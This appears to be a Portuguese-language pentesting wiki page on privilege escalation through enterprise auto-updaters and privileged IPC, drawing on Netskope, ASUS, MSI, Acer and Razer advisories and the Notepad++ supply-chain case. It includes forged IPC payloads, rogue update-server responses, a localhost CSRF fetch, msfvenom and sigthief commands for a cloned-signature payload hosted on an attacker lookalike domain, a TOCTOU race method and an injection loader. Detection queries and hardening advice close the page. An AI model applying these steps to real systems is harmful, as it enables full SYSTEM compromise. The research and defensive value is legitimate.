# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Esta página generaliza uma classe de cadeias de elevação local de privilégio no Windows encontradas em agentes e updaters de endpoint corporativos que expõem uma superfície IPC de baixa fricção e um fluxo de update privilegiado. Um exemplo representativo é o Netskope Client for Windows < R129 (CVE-2025-0309), onde um usuário com poucos privilégios pode forçar o enrollment em um servidor नियंत्रado pelo atacante e então entregar um MSI malicioso que o serviço SYSTEM instala.

Ideias-chave que você pode reutilizar contra produtos similares:
- Abuse the IPC localhost de um serviço privilegiado para forçar re-enrollment ou reconfiguration para um servidor do atacante.
- Implemente os update endpoints do vendor, entregue uma Trusted Root CA maliciosa e aponte o updater para um pacote malicioso “signed”.
- Evite weak signer checks (CN allow-lists), optional digest flags e propriedades MSI permissivas.
- Se o IPC for “encrypted”, derive a key/IV de machine identifiers legíveis por qualquer usuário armazenados no registry.
- Se o serviço restringir callers por image path/process name, injete em um processo allow-listed ou inicie um em estado suspended e faça bootstrap da sua DLL via um minimal thread-context patch.

---
## 1) Forçando enrollment para um servidor do atacante via localhost IPC

Muitos agentes incluem um processo UI em user-mode que fala com um serviço SYSTEM via localhost TCP usando JSON.

Observado no Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Fluxo de exploit:
1) Crie um JWT enrollment token cujas claims controlem o backend host (por exemplo, AddonUrl). Use alg=None para que nenhuma assinatura seja necessária.
2) Envie a mensagem IPC invocando o provisioning command com seu JWT e tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) O serviço começa a acessar seu servidor rogue para enrollment/config, por exemplo:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- If caller verification is path/name-based, originate the request from an allow-listed vendor binary (see §4).

---
## 2) Hijacking o canal de update para executar code como SYSTEM

Once the client talks to your server, implemente os endpoints esperados e direcione-o para um MSI do atacante. Sequência típica:

1) /v2/config/org/clientconfig → Retorne JSON config com um intervalo de updater muito curto, por exemplo:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Retorna um certificado PEM de CA. O serviço o instala no Local Machine Trusted Root store.
3) /v2/checkupdate → Forneça metadados apontando para um MSI malicioso e uma versão falsa.

Bypassing common checks seen in the wild:
- Signer CN allow-list: o serviço pode apenas verificar se o Subject CN é igual a “netSkope Inc” ou “Netskope, Inc.”. Sua rogue CA pode emitir um leaf com esse CN e assinar o MSI.
- CERT_DIGEST property: inclua uma propriedade benigna de MSI chamada CERT_DIGEST. Sem enforcement na instalação.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) desativa validação criptográfica extra.

Result: o serviço SYSTEM instala seu MSI de
C:\ProgramData\Netskope\stAgent\data\*.msi
executando código arbitrário como NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers can reproduce encryption and send valid encrypted commands from a standard user. General tip: se um agent de repente “encrypts” seu IPC, procure por device IDs, product GUIDs, install IDs em HKLM como material.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Some services try to authenticate the peer by resolving the TCP connection’s PID and comparing the image path/name against allow-listed vendor binaries located under Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Two practical bypasses:
- DLL injection into an allow-listed process (e.g., nsdiag.exe) and proxy IPC from inside it.
- Spawn an allow-listed binary suspended and bootstrap your proxy DLL without CreateRemoteThread (see §5) to satisfy driver-enforced tamper rules.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Products often ship a minifilter/OB callbacks driver (e.g., Stadrv) to strip dangerous rights from handles to protected processes:
- Process: removes PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: restricts to THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

A reliable user-mode loader that respects these constraints:
1) CreateProcess of a vendor binary with CREATE_SUSPENDED.
2) Obtain handles you’re still allowed to: PROCESS_VM_WRITE | PROCESS_VM_OPERATION on the process, and a thread handle with THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (or just THREAD_RESUME if you patch code at a known RIP).
3) Overwrite ntdll!NtContinue (or other early, guaranteed-mapped thunk) with a tiny stub that calls LoadLibraryW on your DLL path, then jumps back.
4) ResumeThread to trigger your stub in-process, loading your DLL.

Because you never used PROCESS_CREATE_THREAD or PROCESS_SUSPEND_RESUME on an already-protected process (you created it), the driver’s policy is satisfied.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automates a rogue CA, malicious MSI signing, and serves the needed endpoints: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope is a custom IPC client that crafts arbitrary (optionally AES-encrypted) IPC messages and includes the suspended-process injection to originate from an allow-listed binary.

## 7) Fast triage workflow for unknown updater/IPC surfaces

When facing a new endpoint agent or motherboard “helper” suite, a quick workflow is usually enough to tell whether you are looking at a promising privesc target:

1) Enumerate loopback listeners and map them back to vendor processes:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Enumerar named pipes candidatos:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Minere dados de roteamento apoiados pelo registro usados por servidores IPC baseados em plugin:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Extraia os nomes dos endpoints, as chaves JSON e os command IDs do cliente em modo usuário primeiro. Frontends Electron/.NET compactados frequentemente vazam o schema completo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) Procure pelo predicado de confiança real, não apenas pelo caminho de código que eventualmente inicia o processo:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Padrões que valem priorizar:
- `CryptQueryObject`/certificate parsing sem `WinVerifyTrust` normalmente significa que “certificate exists” foi tratado como “certificate is trusted”, permitindo certificate cloning ou outras fake-signer tricks.
- Verificações de substring/suffix em `Origin`, `Referer`, download URLs, process names ou signer CNs não são authentication. `contains(".vendor.com")` geralmente é explorável com attacker-controlled lookalike domains.
- Se o GUI de baixo privilégio decide “the file is trusted” e o broker em SYSTEM apenas consome esse resultado, patching ou reimplementing a client-side DLL/JS muitas vezes bypassa totalmente o boundary (Razer-style split validation).
- Se o broker copia um payload para `%TEMP%`/`C:\Windows\Temp` e depois valida ou agenda isso a partir desse path, teste imediatamente por TOCTOU replacement windows e por sibling plugin modules que expõem wrappers alternativos `ExecuteTask()` com checks mais fracos.

Para targets com muito uso de named-pipe, PipeViewer é uma forma rápida de identificar weak DACLs e pipes remotamente alcançáveis antes de você começar a reversing the protocol em profundidade.

Se o target autentica callers apenas por PID, image path ou process name, trate isso como um speed bump e não como um boundary: injecting no legitimate client, ou fazer a conexão a partir de um processo allow-listed, muitas vezes é suficiente para satisfazer as checks do server. Para named pipes especificamente, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) cobre o primitive com mais profundidade.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simplesmente faz `string_contains(".asus.com")` no header Origin e nos download URLs expostos por `/asus/v1.0/*`. Qualquer host controlado por attacker, como `https://driverhub.asus.com.attacker.tld`, portanto passa na check e pode emitir state-changing requests via JavaScript. Veja [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) para padrões adicionais de bypass.

Fluxo prático:
1) Registre um domínio que embuta `.asus.com` e hospede uma malicious webpage lá.
2) Use `fetch` ou XHR para chamar um privileged endpoint (por exemplo, `Reboot`, `UpdateApp`) em `http://127.0.0.1:53000`.
3) Envie o JSON body esperado pelo handler – o packed frontend JS mostra o schema abaixo.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Até mesmo a CLI do PowerShell mostrada abaixo tem sucesso quando o header Origin é falsificado para o valor confiável:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualquer visita do navegador ao site do atacante, portanto, torna-se um local CSRF de 1-click (ou 0-click via `onload`) que aciona um helper SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` faz download de executables arbitrários definidos no corpo JSON e os armazena em `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. A validação da URL de download reutiliza a mesma lógica de substring, então `http://updates.asus.com.attacker.tld:8000/payload.exe` é aceita. Após o download, o ADU.exe apenas verifica se o PE contém uma signature e se a string do Subject corresponde a ASUS antes de executá-lo – sem `WinVerifyTrust`, sem validação de chain.

Para weaponize o fluxo:
1) Crie um payload (por exemplo, `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone o signer da ASUS nele (por exemplo, `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hospede `pwn.exe` em um domínio parecido com `.asus.com` e acione o UpdateApp via o browser CSRF acima.

Como tanto os filtros de Origin quanto os de URL são baseados em substring e a verificação do signer só compara strings, o DriverHub baixa e executa o binário do atacante sob seu contexto elevado.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

O serviço SYSTEM do MSI Center expõe um protocolo TCP em que cada frame é `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. O componente principal (Component ID `0f 27 00 00`) inclui `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Seu handler:
1) Copia o executável fornecido para `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica a signature via `CS_CommonAPI.EX_CA::Verify` (o subject do certificate deve ser “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve ter sucesso).
3) Cria uma scheduled task que executa o arquivo temporário como SYSTEM com argumentos controlados pelo atacante.

O arquivo copiado não fica travado entre a verificação e `ExecuteTask()`. Um atacante pode:
- Enviar o Frame A apontando para um binário legítimo assinado pela MSI (garante que a verificação da signature passe e que a task seja enfileirada).
- Fazer race com mensagens repetidas do Frame B apontando para um payload malicioso, sobrescrevendo `MSI Center SDK.exe` logo após a verificação ser concluída.

Quando o scheduler dispara, ele executa o payload sobrescrito sob SYSTEM apesar de ter validado o arquivo original. A exploração confiável usa duas goroutines/threads que fazem spam de CMD_AutoUpdateSDK até vencer a janela de TOCTOU.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Todo plugin/DLL carregado por `MSI.CentralServer.exe` recebe um Component ID armazenado em `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Os primeiros 4 bytes de um frame selecionam esse componente, permitindo que atacantes encaminhem comandos para módulos arbitrários.
- Plugins podem definir seus próprios task runners. `Support\API_Support.dll` expõe `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chama diretamente `API_Support.EX_Task::ExecuteTask()` sem **nenhuma** signature validation – qualquer usuário local pode apontá-lo para `C:\Users\<user>\Desktop\payload.exe` e obter execução SYSTEM de forma determinística.
- Sniffar loopback com Wireshark ou instrumentar os binários .NET no dnSpy revela rapidamente o mapeamento Component ↔ command; clientes customizados em Go/ Python podem então reproduzir os frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) expõe `\\.\pipe\treadstone_service_LightMode`, e sua discretionary ACL permite clientes remotos (por exemplo, `\\TARGET\pipe\treadstone_service_LightMode`). Enviar o command ID `7` com um file path invoca a rotina de spawning de processos do serviço.
- A client library serializa um byte terminador mágico (113) junto com args. Instrumentação dinâmica com Frida/`TsDotNetLib` (veja [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) para dicas de instrumentation) mostra que o handler nativo mapeia esse valor para um `SECURITY_IMPERSONATION_LEVEL` e um integrity SID antes de chamar `CreateProcessAsUser`.
- Trocar 113 (`0x71`) por 114 (`0x72`) cai no branch genérico que mantém o token SYSTEM completo e define um SID de high-integrity (`S-1-16-12288`). O binário criado, portanto, roda como SYSTEM irrestrito, tanto localmente quanto entre máquinas.
- Combine isso com o flag exposto do installer (`Setup.exe -nocheck`) para subir o ACC até mesmo em VMs de laboratório e exercitar o pipe sem hardware do vendor.

Esses bugs de IPC destacam por que serviços locais devem impor mutual authentication (ALPC SIDs, filtros `ImpersonationLevel=Impersonation`, token filtering) e por que todo helper de “run arbitrary binary” de um módulo precisa compartilhar as mesmas verificações de signer.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

O Razer Synapse 4 adicionou outro padrão útil a essa família: um usuário com poucos privilégios pode pedir a um helper COM para iniciar um processo por meio de `RzUtility.Elevator`, enquanto a decisão de confiança é delegada a uma DLL em user-mode (`simple_service.dll`) em vez de ser aplicada de forma robusta dentro do boundary privilegiado.

Caminho de exploração observado:
- Instancie o objeto COM `RzUtility.Elevator`.
- Chame `LaunchProcessNoWait(<path>, "", 1)` para solicitar um launch elevado.
- No PoC público, o gate da PE-signature dentro de `simple_service.dll` é patchado antes de emitir a solicitação, permitindo que um executável arbitrário escolhido pelo atacante seja iniciado.

Invocação mínima em PowerShell:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
Takeaway geral: ao reverter suítes “helper”, não pare em localhost TCP ou named pipes. Verifique classes COM com nomes como `Elevator`, `Launcher`, `Updater` ou `Utility`, depois confirme se o serviço privilegiado realmente valida o binário de destino ou apenas confia em um resultado calculado por uma DLL de cliente em user-mode passível de patch. Esse padrão vai além da Razer: qualquer design dividido em que o broker de alta privilégio consome uma decisão allow/deny da parte de baixa privilégio é um candidato a superfície de privesc.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Entre junho de 2025 e dezembro de 2025, attackers que comprometeram a infraestrutura de hosting por trás do fluxo de update do Notepad++ serviram de forma seletiva manifests maliciosos para vítimas escolhidas. Updaters antigos baseados em WinGUp não verificavam totalmente a autenticidade do update, então uma resposta XML hostil podia redirecionar clients para URLs controladas pelo attacker. Como o client aceitava conteúdo HTTPS sem impor tanto uma trusted certificate chain quanto uma assinatura PE válida no installer baixado, vítimas baixavam e executavam um `update.exe` NSIS trojanized.

Fluxo operacional (sem exploit local necessário):
1. **Intercepção de infraestrutura**: comprometa CDN/hosting e responda às verificações de update com metadata do attacker apontando para uma URL de download maliciosa.
2. **NSIS trojanized**: o installer busca/executa um payload e abusa de duas cadeias de execução:
- **Bring-your-own signed binary + sideload**: inclua o Bitdefender assinado `BluetoothService.exe` e solte uma `log.dll` maliciosa no search path dele. Quando o binário assinado é executado, o Windows faz sideload de `log.dll`, que decripta e carrega reflective o backdoor Chrysalis (protegido por Warbird + API hashing para dificultar detecção estática).
- **Scripted shellcode injection**: NSIS executa um script Lua compilado que usa Win32 APIs (por exemplo, `EnumWindowStationsW`) para injetar shellcode e preparar o Cobalt Strike Beacon.

Takeaways de hardening/detection para qualquer auto-updater:
- Imponha verificação de **certificate + signature** do installer baixado (faça pin do signer do vendor, rejeite CN/chain incompatíveis) e assine o próprio update manifest (por exemplo, XMLDSig). Bloqueie redirects controlados pelo manifest, a menos que validados.
- Trate **BYO signed binary sideloading** como um pivot de detecção pós-download: alerte quando um EXE assinado de vendor carrega um nome de DLL de fora do seu canonical install path (por exemplo, Bitdefender carregando `log.dll` de Temp/Downloads) e quando um updater solta/executa installers a partir de temp com assinaturas não-vendor.
- Monitore **artefatos específicos de malware** observados nessa cadeia (úteis como pivots genéricos): mutex `Global\Jdhfv_1.0.1`, writes anômalos do `gup.exe` em `%TEMP%`, e estágios de injeção de shellcode guiados por Lua.
- O Notepad++ respondeu fortalecendo o WinGUp na v8.8.9 e posteriores: o XML retornado agora é assinado (XMLDSig), e builds mais novos impõem verificação de certificate + signature do installer baixado em vez de confiar apenas no transporte.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> lançando um instalador que não seja do Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Esses padrões se generalizam para qualquer updater que aceite manifests não assinados ou falhe em fixar os signers do installer—network hijack + malicious installer + BYO-signed sideloading resulta em remote code execution sob a aparência de updates “trusted”.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
